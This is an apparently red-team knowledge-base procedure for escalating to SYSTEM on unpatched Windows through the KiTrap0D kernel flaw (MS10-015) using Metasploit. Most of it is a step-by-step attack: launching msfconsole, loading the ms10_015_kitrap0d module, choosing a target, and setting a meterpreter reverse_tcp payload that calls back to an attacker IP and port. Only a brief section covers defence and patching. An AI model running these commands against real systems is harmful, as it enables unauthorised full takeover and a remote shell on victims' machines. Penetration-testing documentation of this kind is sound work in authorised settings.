---
id: a303bad0-2fb6-4afc-bf7b-0c79383e5216
name: KiTrap0D-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:30.418151+00:00'
updated_at: '2023-04-10T20:37:33.719970+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - '[[tags/EoP - Common Vulnerabilities and Exposure]]'
  - >-
    [[tags/MS10-015 (KiTrap0D) - Microsoft Windows
    NT/2000/2003/2008/XP/Vista/7]]
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/msfconsole-launch]]'
  - '[[commands/msfconsole-use-module]]'
  - '[[commands/msfconsole-set-target]]'
  - '[[commands/msfconsole-set-payload]]'
  - '[[commands/msfconsole-run-exploit]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# KiTrap0D-Privilege-Escalation

## Summary

KiTrap0D Privilege Escalation exploits a vulnerability in the Windows kernel's KiTrap0D system call handler (CVE-2010-0232, patched in MS10-015) to elevate privileges from a low-privileged user to SYSTEM level. This procedure uses the Metasploit Framework to load and execute the exploit module, allowing arbitrary code execution in kernel mode for full system control.

## Description

The KiTrap0D vulnerability affects Windows NT/2000/XP/2003/2008/Vista/7 systems prior to the MS10-015 patch. It occurs in the kernel's handling of system calls, enabling an authenticated user to overwrite kernel memory and gain elevated privileges. This technique is useful in post-exploitation scenarios where initial low-privilege access is obtained, such as via phishing or weak credentials. The exploit can lead to persistence, data exfiltration, or further lateral movement. Success requires local execution on a vulnerable unpatched system, and it maps to MITRE ATT&CK T1068 for kernel exploitation.

## Requirements

1. Local low-privileged user access on a vulnerable Windows system (unpatched MS10-015, versions NT/2000/XP/2003/2008/Vista/7).
2. Metasploit Framework installed on the attacker's machine (Kali Linux recommended).
3. Network access if delivering remotely, but typically executed locally.
4. Basic knowledge of Metasploit for module configuration.

## Defense

- Apply the MS10-015 security update or later patches to mitigate the vulnerability.
- Enforce least privilege principles to limit low-privileged user execution capabilities.
- Monitor kernel events, process creation, and privilege changes using tools like Sysmon or Windows Event Logs (Event ID 4672 for privilege assignments).
- Use application whitelisting (e.g., AppLocker) to block unauthorized executables.

## Objectives

1. Escalate from low-privileged user to SYSTEM privileges.
2. Execute arbitrary kernel-mode code for system takeover.
3. Enable further post-exploitation activities like persistence or data access.

## Instructions

### Step 1: Launch Metasploit Console

**Context**: Start the Metasploit Framework console to access exploit modules. This initializes the environment for loading the KiTrap0D exploit.

**Command** ([[commands/msfconsole-launch]]):
```bash
msfconsole
```

> This command opens the interactive msfconsole prompt. Wait for the 'msf6 >' prompt to appear, indicating readiness. Expected output includes the Metasploit banner and available commands list.

### Step 2: Load the KiTrap0D Exploit Module

**Context**: Select the specific exploit module for MS10-015 KiTrap0D to prepare for configuration. This loads the vulnerability handler into the session.

**Command** ([[commands/msfconsole-use-module]]):
```msfconsole
use exploit/windows/local/ms10_015_kitrap0d
```

> Run this at the msfconsole prompt. Expected output shows module details, including name, description, and options like 'RHOST' (though local, it may reference session). If the module is unavailable, update Metasploit with 'msfupdate'.

### Step 3: Set the Target System

**Context**: Configure the target architecture and version to match the vulnerable Windows system, ensuring compatibility for the exploit payload.

**Command** ([[commands/msfconsole-set-target]]):
```msfconsole
set target $_TARGET_ID
```

> Replace $_TARGET_ID with the appropriate ID from 'show targets' (e.g., 0 for Windows 7 x86). Expected output: 'target => X' confirmation. Run 'show targets' first to list options like Windows XP SP3 or Windows 7.

### Step 4: Set the Payload

**Context**: Choose a payload for post-exploitation, such as a meterpreter shell, to establish a SYSTEM-level session after escalation.

**Command** ([[commands/msfconsole-set-payload]]):
```msfconsole
set payload windows/meterpreter/reverse_tcp
set LHOST $_ATTACKER_IP
set LPORT $_ATTACKER_PORT
```

> Replace $_ATTACKER_IP and $_ATTACKER_PORT with your listener details (e.g., 192.168.1.100:4444). Expected output: Payload and option confirmations. Start a listener with 'msfconsole' and 'use multi/handler' beforehand if needed.

### Step 5: Execute the Exploit

**Context**: Run the exploit to trigger the KiTrap0D vulnerability and elevate privileges. This attempts kernel memory corruption for SYSTEM access.

**Command** ([[commands/msfconsole-run-exploit]]):
```msfconsole
exploit
```

> This launches the exploit on the target. Expected output: Progress messages, followed by a successful meterpreter session if vulnerable (e.g., 'Meterpreter session X opened'). Failure may show 'Exploit failed' if patched or incompatible.
